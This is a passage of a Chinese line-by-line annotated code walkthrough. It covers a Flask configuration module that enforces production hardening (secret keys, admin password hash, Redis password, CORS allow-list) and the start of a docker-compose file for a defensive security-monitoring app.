| 26 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "REPLACE_ME_WITH_64_HEX_CHARS",` |
| 27 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "your-secret-key",` |
| 28 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "please-change-me",` |
| 29 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 30 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 31 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 32 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 33 | 函数定义：声明 `_require_env` 的输入、处理逻辑和返回结果。 | `def _require_env(key: str) -> str:` |
| 34 | 文档字符串：说明当前模块、类或函数的职责。 | `    """强制从环境变量获取配置，缺失则抛出异常。"""` |
| 35 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    value = os.environ.get(key)` |
| 36 | 条件判断：满足条件时进入对应分支。 | `    if value is None or value == "":` |
| 37 | 抛出异常：主动报告不可继续的错误。 | `        raise RuntimeError(` |
| 38 | 代码语句：参与当前文件的业务流程或数据处理。 | `            f"环境变量 {key} 未设置。请参考 .env.example 配置环境变量。"` |
| 39 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 40 | 返回结果：把处理后的值交回调用方。 | `    return value` |
| 41 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 42 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 43 | 函数定义：声明 `_resolve_secret_key` 的输入、处理逻辑和返回结果。 | `def _resolve_secret_key() -> str:` |
| 44 | 文档字符串：说明当前模块、类或函数的职责。 | `    """按环境解析 SECRET_KEY。开发/测试允许不安全默认值；生产必须显式设置。"""` |
| 45 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    key = os.environ.get("SECRET_KEY")` |
| 46 | 条件判断：满足条件时进入对应分支。 | `    if key:` |
| 47 | 返回结果：把处理后的值交回调用方。 | `        return key` |
| 48 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    env = os.environ.get("FLASK_ENV", "development")` |
| 50 | 条件判断：满足条件时进入对应分支。 | `    if env == "development":` |
| 51 | 返回结果：把处理后的值交回调用方。 | `        return "dev-only-insecure-key-never-use-in-production"` |
| 52 | 条件判断：满足条件时进入对应分支。 | `    if env == "testing":` |
| 53 | 返回结果：把处理后的值交回调用方。 | `        return "test-only-secret-key"` |
| 54 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 55 | 返回结果：把处理后的值交回调用方。 | `    return _require_env("SECRET_KEY")` |
| 56 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 57 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 58 | 函数定义：声明 `_parse_allowed_origins` 的输入、处理逻辑和返回结果。 | `def _parse_allowed_origins(raw: str) -> List[str]:` |
| 59 | 文档字符串：说明当前模块、类或函数的职责。 | `    """逗号分隔 Origin 列表，去空白、去空项；禁止裸 \`\`*\`\` 作为条目。"""` |
| 60 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    parts = [x.strip() for x in (raw or "").split(",")]` |
| 61 | 返回结果：把处理后的值交回调用方。 | `    return [p for p in parts if p and p != "*"]` |
| 62 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 63 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 64 | 函数定义：声明 `_validate_production_hardening` 的输入、处理逻辑和返回结果。 | `def _validate_production_hardening(cfg: Type["Config"]) -> None:` |
| 65 | 文档字符串：说明当前模块、类或函数的职责。 | `    """生产环境启动前强制项：密钥、管理员哈希、Redis 密码、CORS 白名单。"""` |
| 66 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    sk = (os.environ.get("SECRET_KEY") or "").strip()` |
| 67 | 条件判断：满足条件时进入对应分支。 | `    if not sk:` |
| 68 | 抛出异常：主动报告不可继续的错误。 | `        raise RuntimeError("生产环境必须设置非空 SECRET_KEY。")` |
| 69 | 条件判断：满足条件时进入对应分支。 | `    if sk in _FORBIDDEN_PRODUCTION_SECRET_KEYS:` |
| 70 | 抛出异常：主动报告不可继续的错误。 | `        raise RuntimeError(` |
| 71 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "生产环境禁止使用默认或示例 SECRET_KEY，请使用高强度随机值生成新的密钥。"` |
| 72 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 73 | 条件判断：满足条件时进入对应分支。 | `    if len(sk) < 32:` |
| 74 | 抛出异常：主动报告不可继续的错误。 | `        raise RuntimeError("生产环境 SECRET_KEY 长度建议至少 32 字符。")` |
| 75 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 76 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    admin_hash = (os.environ.get("ADMIN_PASSWORD_HASH") or "").strip()` |
| 77 | 条件判断：满足条件时进入对应分支。 | `    if not admin_hash:` |
| 78 | 抛出异常：主动报告不可继续的错误。 | `        raise RuntimeError(` |
| 79 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "生产环境必须设置 ADMIN_PASSWORD_HASH（禁止仅依赖明文 ADMIN_PASSWORD）。"` |
| 80 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            " 使用: python scripts/generate_admin_password_hash.py"` |
| 81 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 82 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 83 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    redis_pwd = (os.environ.get("REDIS_PASSWORD") or "").strip()` |
| 84 | 条件判断：满足条件时进入对应分支。 | `    if not redis_pwd:` |
| 85 | 抛出异常：主动报告不可继续的错误。 | `        raise RuntimeError(` |
| 86 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "生产环境必须设置 REDIS_PASSWORD，避免 Redis 无鉴权暴露。"` |
| 87 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 88 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    raw_origins = os.environ.get("ALLOWED_ORIGINS", "") or ""` |
| 90 | 循环：逐个处理集合或迭代器中的元素。 | `    for token in raw_origins.split(","):` |
| 91 | 条件判断：满足条件时进入对应分支。 | `        if token.strip() == "*":` |
| 92 | 抛出异常：主动报告不可继续的错误。 | `            raise RuntimeError("生产环境 CORS 禁止使用通配符 *。")` |
| 93 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 94 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    origins = list(getattr(cfg, "ALLOWED_ORIGINS", []) or [])` |
| 95 | 条件判断：满足条件时进入对应分支。 | `    if not origins:` |
| 96 | 抛出异常：主动报告不可继续的错误。 | `        raise RuntimeError(` |
| 97 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "生产环境 ALLOWED_ORIGINS 不能为空；请配置逗号分隔的 https 站点 Origin。"` |
| 98 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 99 | 循环：逐个处理集合或迭代器中的元素。 | `    for o in origins:` |
| 100 | 条件判断：满足条件时进入对应分支。 | `        if o.strip() == "*":` |
| 101 | 抛出异常：主动报告不可继续的错误。 | `            raise RuntimeError("生产环境 CORS 禁止使用通配符 *。")` |
| 102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        lo = o.lower()` |
| 103 | 条件判断：满足条件时进入对应分支。 | `        if not (lo.startswith("http://") or lo.startswith("https://")):` |
| 104 | 抛出异常：主动报告不可继续的错误。 | `            raise RuntimeError(f"生产环境 CORS Origin 必须以 http:// 或 https:// 开头: {o!r}")` |
| 105 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 106 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 107 | 类定义：声明 `Config`，封装相关状态与行为。 | `class Config:` |
| 108 | 文档字符串：说明当前模块、类或函数的职责。 | `    """基础配置。"""` |
| 109 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 110 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    SQLALCHEMY_DATABASE_URI = os.environ.get("DATABASE_URL", "sqlite:///security.db")` |
| 111 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    SQLALCHEMY_TRACK_MODIFICATIONS = False` |
| 112 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 113 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    REDIS_HOST = os.environ.get("REDIS_HOST", "localhost")` |
| 114 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    REDIS_PORT = int(os.environ.get("REDIS_PORT", "6379"))` |
| 115 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    REDIS_DB = int(os.environ.get("REDIS_DB", "0"))` |
| 116 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    REDIS_PASSWORD = os.environ.get("REDIS_PASSWORD", "")` |
| 117 | 注释：解释下面或当前这段代码的设计意图。 | `    # 生产落地保护：关键依赖是否必须可用（不可用时启动失败）` |
| 118 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    REQUIRE_REDIS_AVAILABLE = (` |
| 119 | 函数调用：执行已有函数/方法完成当前步骤。 | `        os.environ.get("REQUIRE_REDIS_AVAILABLE", "false").lower() == "true"` |
| 120 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 121 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    REQUIRE_MODELS_READY = (` |
| 122 | 函数调用：执行已有函数/方法完成当前步骤。 | `        os.environ.get("REQUIRE_MODELS_READY", "false").lower() == "true"` |
| 123 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 124 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 125 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    GUARDIAN_ALERT_STREAM = os.environ.get("GUARDIAN_ALERT_STREAM", "guardian:alerts")` |
| 126 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    GUARDIAN_ALERT_STREAM_GROUP = os.environ.get("GUARDIAN_ALERT_STREAM_GROUP", "guardian:web")` |
| 127 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ALERT_STREAM_CONSUMER_AUTOSTART = os.environ.get(` |
| 128 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "ALERT_STREAM_CONSUMER_AUTOSTART", "true"` |
| 129 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ).lower() == "true"` |
| 130 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 131 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    LOG_DIR = "logs"` |
| 132 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    LOG_LEVEL = os.environ.get("LOG_LEVEL", "INFO")` |
| 133 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    MODEL_DIR = "models/saved"` |
| 134 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 135 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ABUSEIPDB_API_KEY = os.environ.get("ABUSEIPDB_API_KEY", "")` |
| 136 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    VIRUSTOTAL_API_KEY = os.environ.get("VIRUSTOTAL_API_KEY", "")` |
| 137 | 注释：解释下面或当前这段代码的设计意图。 | `    # 威胁情报：单次 HTTP 超时（秒）、并行外部查询总等待上限（秒，超时则降级不判恶意）` |
| 138 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    THREAT_INTEL_HTTP_TIMEOUT = float(os.environ.get("THREAT_INTEL_HTTP_TIMEOUT", "5"))` |
| 139 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    THREAT_INTEL_EXTERNAL_WAIT_SEC = float(os.environ.get("THREAT_INTEL_EXTERNAL_WAIT_SEC", "0.45"))` |
| 140 | 注释：解释下面或当前这段代码的设计意图。 | `    # DeepSeek/OpenAI-compatible endpoint config` |
| 141 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    DEEPSEEK_API_BASE = os.environ.get("DEEPSEEK_API_BASE", "")` |
| 142 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    DEEPSEEK_API_KEY = os.environ.get("DEEPSEEK_API_KEY", "")` |
| 143 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 144 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    SECRET_KEY = _resolve_secret_key()` |
| 145 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    JWT_TOKEN_EXPIRES = int(os.environ.get("JWT_TOKEN_EXPIRES", "3600"))` |
| 146 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    JWT_REFRESH_TOKEN_EXPIRES = int(os.environ.get("JWT_REFRESH_TOKEN_EXPIRES", "86400"))` |
| 147 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 148 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    API_RATE_LIMIT = os.environ.get("API_RATE_LIMIT", "100 per minute")` |
| 149 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ALLOWED_ORIGINS = _parse_allowed_origins(` |
| 150 | 函数调用：执行已有函数/方法完成当前步骤。 | `        os.environ.get("ALLOWED_ORIGINS", "http://localhost:5000")` |
| 151 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 152 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 153 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ALERT_EMAIL = os.environ.get("ALERT_EMAIL", "")` |
| 154 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ALERT_WEBHOOK = os.environ.get("ALERT_WEBHOOK", "")` |
| 155 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ALERT_SMTP_HOST = os.environ.get("ALERT_SMTP_HOST", "")` |
| 156 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ALERT_SMTP_PORT = int(os.environ.get("ALERT_SMTP_PORT", "587"))` |
| 157 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ALERT_SMTP_USER = os.environ.get("ALERT_SMTP_USER", "")` |
| 158 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ALERT_SMTP_PASSWORD = os.environ.get("ALERT_SMTP_PASSWORD", "")` |
| 159 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ALERT_SMTP_FROM = os.environ.get("ALERT_SMTP_FROM", "")` |
| 160 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ALERT_SMTP_USE_TLS = os.environ.get("ALERT_SMTP_USE_TLS", "true").lower() == "true"` |
| 161 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ALERT_NOTIFY_MAX_RETRIES = int(os.environ.get("ALERT_NOTIFY_MAX_RETRIES", "3"))` |
| 162 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ALERT_ENTERPRISE_CHANNEL_ENABLED = (` |
| 163 | 函数调用：执行已有函数/方法完成当前步骤。 | `        os.environ.get("ALERT_ENTERPRISE_CHANNEL_ENABLED", "").lower() == "true"` |
| 164 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 165 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 166 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    RESPONSE_FIREWALL_BACKEND = os.environ.get("RESPONSE_FIREWALL_BACKEND", "iptables")` |
| 167 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    RESPONSE_HOST_ISOLATION = os.environ.get("RESPONSE_HOST_ISOLATION", "none")` |
| 168 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    RESPONSE_BUSINESS_IP_WHITELIST = os.environ.get("RESPONSE_BUSINESS_IP_WHITELIST", "")` |
| 169 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    RESPONSE_PRIVATE_IP_WHITELIST = os.environ.get("RESPONSE_PRIVATE_IP_WHITELIST", "")` |
| 170 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 171 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    LOG_INTEGRITY_ENABLED = os.environ.get("LOG_INTEGRITY_ENABLED", "true").lower() == "true"` |
| 172 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    LOG_INTEGRITY_ALGORITHM = "sha256"` |
| 173 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 174 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 175 | 类定义：声明 `DevelopmentConfig`，封装相关状态与行为。 | `class DevelopmentConfig(Config):` |
| 176 | 文档字符串：说明当前模块、类或函数的职责。 | `    """开发环境配置。"""` |
| 177 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 178 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    DEBUG = True` |
| 179 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    SECRET_KEY = os.environ.get("SECRET_KEY", "dev-only-insecure-key-never-use-in-production")` |
| 180 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    SQLALCHEMY_DATABASE_URI = os.environ.get("DATABASE_URL", "sqlite:///data/security.db")` |
| 181 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 182 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 183 | 类定义：声明 `ProductionConfig`，封装相关状态与行为。 | `class ProductionConfig(Config):` |
| 184 | 文档字符串：说明当前模块、类或函数的职责。 | `    """生产环境配置。"""` |
| 185 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 186 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    DEBUG = False` |
| 187 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    LOG_INTEGRITY_ENABLED = True` |
| 188 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 189 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 190 | 类定义：声明 `TestingConfig`，封装相关状态与行为。 | `class TestingConfig(Config):` |
| 191 | 文档字符串：说明当前模块、类或函数的职责。 | `    """测试环境配置。"""` |
| 192 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 193 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    TESTING = True` |
| 194 | 注释：解释下面或当前这段代码的设计意图。 | `    # 默认内存库；若运行时设置了 \`\`DATABASE_URL\`\`（如 pytest 临时文件），由 \`\`get_config()\`\` 覆盖。` |
| 195 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    SQLALCHEMY_DATABASE_URI = "sqlite:///:memory:"` |
| 196 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    SECRET_KEY = os.environ.get("SECRET_KEY", "test-only-secret-key")` |
| 197 | 注释：解释下面或当前这段代码的设计意图。 | `    # 避免 pytest 挂起：默认不拉起后台 consumer，需要时用环境变量显式开启` |
| 198 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ALERT_STREAM_CONSUMER_AUTOSTART = (` |
| 199 | 函数调用：执行已有函数/方法完成当前步骤。 | `        os.environ.get("ALERT_STREAM_CONSUMER_AUTOSTART", "").lower() == "true"` |
| 200 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 201 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 202 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 203 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `config_map: dict[str, Type[Config]] = {` |
| 204 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "development": DevelopmentConfig,` |
| 205 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "production": ProductionConfig,` |
| 206 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "testing": TestingConfig,` |
| 207 | 代码语句：参与当前文件的业务流程或数据处理。 | `}` |
| 208 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 209 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 210 | 函数定义：声明 `get_config` 的输入、处理逻辑和返回结果。 | `def get_config() -> Type[Config]:` |
| 211 | 文档字符串：说明当前模块、类或函数的职责。 | `    """根据 FLASK_ENV 环境变量返回对应配置类，并执行生产环境校验。"""` |
| 212 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    env = os.environ.get("FLASK_ENV", "development")` |
| 213 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    cfg = config_map.get(env, DevelopmentConfig)` |
| 214 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 215 | 注释：解释下面或当前这段代码的设计意图。 | `    # TestingConfig 类属性在 import 时固定为内存库；每次按当前环境变量解析，避免类属性泄漏。` |
| 216 | 条件判断：满足条件时进入对应分支。 | `    if env == "testing":` |
| 217 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg.SQLALCHEMY_DATABASE_URI = os.environ.get(` |
| 218 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "DATABASE_URL", "sqlite:///:memory:"` |
| 219 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 220 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 221 | 条件判断：满足条件时进入对应分支。 | `    if env == "production":` |
| 222 | 函数调用：执行已有函数/方法完成当前步骤。 | `        _require_env("DATABASE_URL")` |
| 223 | 函数调用：执行已有函数/方法完成当前步骤。 | `        _require_env("SECRET_KEY")` |
| 224 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg.SQLALCHEMY_DATABASE_URI = os.environ["DATABASE_URL"]` |
| 225 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg.SECRET_KEY = os.environ["SECRET_KEY"]` |
| 226 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg.REQUIRE_REDIS_AVAILABLE = (` |
| 227 | 函数调用：执行已有函数/方法完成当前步骤。 | `            os.environ.get("REQUIRE_REDIS_AVAILABLE", "true").lower() == "true"` |
| 228 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 229 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg.REQUIRE_MODELS_READY = (` |
| 230 | 函数调用：执行已有函数/方法完成当前步骤。 | `            os.environ.get("REQUIRE_MODELS_READY", "true").lower() == "true"` |
| 231 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 232 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg.ALLOWED_ORIGINS = _parse_allowed_origins(` |
| 233 | 函数调用：执行已有函数/方法完成当前步骤。 | `            os.environ.get("ALLOWED_ORIGINS", "")` |
| 234 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 235 | 函数调用：执行已有函数/方法完成当前步骤。 | `        _validate_production_hardening(cfg)` |
| 236 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 237 | 返回结果：把处理后的值交回调用方。 | `    return cfg` |

## `docker-compose.yml`

- 类型：部署与依赖
- 行数：177

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 配置注释：解释配置项用途。 | `# AI-Security-Guardian docker-compose（Phase 8：集成与部署）` |
| 2 | 配置注释：解释配置项用途。 | `# 对应架构文档 §11 + Phase 8 提示词 C 节` |
| 3 | 配置注释：解释配置项用途。 | `#` |
| 4 | 配置注释：解释配置项用途。 | `# 本编排提供：` |
| 5 | 配置注释：解释配置项用途。 | `#   1. app 服务（Phase 7 Flask/API 层；默认启动）` |
| 6 | 配置注释：解释配置项用途。 | `#   2. redis 服务（缓存 / 轻量消息队列，含密码 + healthcheck）` |
| 7 | 配置注释：解释配置项用途。 | `#   3. guardian 服务（完整检测链路，需抓包权限；可选 profile: full-chain）` |
| 8 | 配置注释：解释配置项用途。 | `#   4. 环境变量全部经由 .env 注入（禁止硬编码敏感凭据）` |
| 9 | 配置注释：解释配置项用途。 | `#   5. 模型目录只读挂载、日志目录可写挂载` |
| 10 | 配置注释：解释配置项用途。 | `#   6. depends_on + condition: service_healthy：Redis 先起再起 app` |
| 11 | 配置注释：解释配置项用途。 | `#   7. restart: unless-stopped` |
| 12 | 配置注释：解释配置项用途。 | `#   8. CPU / 内存资源限制` |
| 13 | 配置注释：解释配置项用途。 | `#` |
| 14 | 配置注释：解释配置项用途。 | `# 使用：` |
| 15 | 配置注释：解释配置项用途。 | `#   1) 首次：cp .env.example .env 并修改 SECRET_KEY / ADMIN_PASSWORD_HASH / REDIS_PASSWORD` |
| 16 | 配置注释：解释配置项用途。 | `#   2) 仅 Web/API 层（日常调试 / 前端联调，默认）：` |
| 17 | 配置注释：解释配置项用途。 | `#        docker compose up --build` |
| 18 | 配置注释：解释配置项用途。 | `#   3) Web + 完整检测链路（需要 CAP_NET_RAW，宿主机需支持）：` |
| 19 | 配置注释：解释配置项用途。 | `#        docker compose --profile full-chain up --build` |
| 20 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `services:` |
| 21 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `  app:` |
| 22 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    build:` |
| 23 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      context: .` |
| 24 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      dockerfile: Dockerfile` |
| 25 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      args:` |
| 26 | 配置注释：解释配置项用途。 | `        # 国内网络构建时可在 .env 中设置 PIP_INDEX_URL / APT_MIRROR 加速` |
| 27 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `        PIP_INDEX_URL: ${PIP_INDEX_URL:-https://pypi.org/simple}` |
| 28 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `        APT_MIRROR: ${APT_MIRROR:-}` |
| 29 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    image: ai-security-guardian:latest` |
| 30 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    container_name: ai-security-guardian-app` |
| 31 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    restart: unless-stopped` |
| 32 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    ports:` |
| 33 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      - "5000:5000"` |
| 34 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    env_file:` |
| 35 | YAML 列表项：声明集合中的一个配置值。 | `      - .env` |
| 36 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    environment:` |
| 37 | 配置注释：解释配置项用途。 | `      # 关键变量：compose 允许上层 shell 覆盖，未设置时退回 .env` |
| 38 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      FLASK_ENV: ${FLASK_ENV:-production}` |
| 39 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      REDIS_HOST: redis` |
| 40 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      REDIS_PORT: "6379"` |
| 41 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      REDIS_DB: "0"` |
| 42 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      REDIS_PASSWORD: ${REDIS_PASSWORD:-}` |
| 43 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      DATABASE_URL: ${DATABASE_URL:-sqlite:////app/data/security.db}` |
| 44 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      AUTO_CREATE_DB_TABLES: ${AUTO_CREATE_DB_TABLES:-false}` |
| 45 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      DRY_RUN: ${DRY_RUN:-true}` |
| 46 | 配置注释：解释配置项用途。 | `      # Web/API 层默认不启用抓包 / 日志采集` |
| 47 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      ENABLE_PACKET_CAPTURE: "false"` |
| 48 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      ENABLE_WEB_LOG: "false"` |
| 49 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      LOG_LEVEL: ${LOG_LEVEL:-INFO}` |
| 50 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      ALLOWED_ORIGINS: ${ALLOWED_ORIGINS:-http://localhost:5000}` |
| 51 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    volumes:` |
| 52 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      - ./models/saved:/app/models/saved:ro` |
| 53 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      - ./logs:/app/logs` |
| 54 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `      - ./data:/app/data` |
| 55 | YAML 配置：定义服务、环境变量、卷或运行参数。 | `    depends_on:` |
